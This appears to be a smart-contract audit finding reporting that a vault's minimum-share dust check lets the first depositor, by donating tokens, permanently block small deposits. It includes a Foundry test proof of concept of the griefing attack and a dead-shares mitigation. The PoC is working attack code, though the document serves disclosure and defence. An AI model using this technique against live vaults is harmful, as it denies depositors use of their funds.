S-362
Vault deposit dust check can be exploited with inflation attack to break small deposits indefinitely
muellerberndt
00
Sufficient
383d ago
Finding description and impact

The vault deposit function verifies that each deposit creates at least 1e8 shares. This prevents attackers from abusing inflation attacks to steal funds from users. However, the first depositor can manipulate the conversion rate such that small deposits will always fail, creating a griefing attack vector.

Proof of Concept

The following test demonstrates the issue. Here, the first depositor first deposits 1 token followed by a donation of 10 tokens (10 * 1e18). From then on (during the lifetime of the vault) smaller deposits such as 0.5 tokens (0.5 * 1e18) will no longer be possible as the issued amount of shares would fall below the dust limit.

uint32 private constant DUST = 1e8;

function test_inflationAttack() public {

        (ConcreteMultiStrategyVault newVault, Strategy[] memory strats) = _createNewVault(false, false, false);

        uint256 mintAmount = 1000 ether;
        uint256 depositAmount = 10 ether;

        asset.mint(hazel, mintAmount);

        vm.startPrank(hazel);
        asset.approve(address(newVault), mintAmount);
        uint256 hazelShares = newVault.deposit(1, hazel);
        vm.stopPrank();

        uint256 assets = newVault.previewDeposit(depositAmount);

        console.log("Shares for 10 ether deposit", assets);
        console.log("Attacker balance", newVault.balanceOf(hazel));
        console.log("TotalSupply", newVault.totalSupply());
        console.log("Vault asset balance", asset.balanceOf(address(newVault)));

        vm.prank(hazel);
        asset.transfer(address(newVault), depositAmount);

        assets = newVault.previewDeposit(0.5 ether);
        console.log("Shares for 0.5 token after attack", assets);

        assertLt(assets, DUST);

        vm.expectRevert();

        vm.prank(hazel);
        newVault.deposit(0.5 ether, hazel);
    }


Recommended mitigation steps

Instead of doing the dust check, use a proven method of preventing inflation attacks such as creating dead shares upon the first deposit (see also this OpenZeppelin article).
